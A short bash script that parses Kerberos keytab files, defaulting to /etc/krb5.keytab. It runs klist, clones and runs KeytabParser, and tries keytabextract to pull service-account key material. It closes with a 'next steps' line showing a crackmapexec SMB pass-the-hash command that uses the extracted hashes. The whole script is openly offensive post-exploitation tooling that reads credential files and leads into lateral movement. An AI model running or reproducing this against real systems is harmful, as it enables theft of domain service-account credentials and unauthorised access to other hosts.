#!/bin/bash
# Parse keytab files to extract service account information

KEYTAB_FILE="${1:-/etc/krb5.keytab}"

echo "=== Parsing Keytab File ==="
echo "Target file: $KEYTAB_FILE"
echo ""

# Check if file exists
if [ ! -f "$KEYTAB_FILE" ]; then
    echo "✗ Keytab file not found: $KEYTAB_FILE"
    echo ""
    echo "Common locations:"
    echo "  /etc/krb5.keytab"
    echo "  /etc/security/keytab/"
    echo "  /var/kerberos/krb5kdc/kadm5.keytab"
    exit 1
fi

echo "✓ Keytab file found"
echo ""

# Try klist first (if available)
echo "=== Using klist ==="
if command -v klist &> /dev/null; then
    klist -k "$KEYTAB_FILE" 2>/dev/null || echo "klist failed or no output"
else
    echo "klist not installed"
fi
echo ""

# Try KeytabParser
echo "=== Using KeytabParser ==="
if [ -d KeytabParser ]; then
    echo "KeytabParser already cloned"
else
    echo "Cloning KeytabParser..."
    git clone https://github.com/its-a-feature/KeytabParser
fi

cd KeytabParser
if [ -f KeytabParser.py ]; then
    python3 KeytabParser.py "$KEYTAB_FILE" 2>/dev/null || echo "KeytabParser failed"
else
    echo "KeytabParser.py not found"
fi
cd ..
echo ""

# Try keytabextract (if available)
echo "=== Using keytabextract ==="
if [ -f keytabextract.py ]; then
    python3 keytabextract.py "$KEYTAB_FILE" 2>/dev/null || echo "keytabextract failed"
else
    echo "keytabextract.py not found"
fi
echo ""

echo "=== Done ==="
echo ""
echo "Next steps:"
echo "  - Use extracted hashes with crackmapexec:"
echo "    crackmapexec smb <target> -u 'ServiceAccount\$' -H '<hash>' -d '<domain>'"
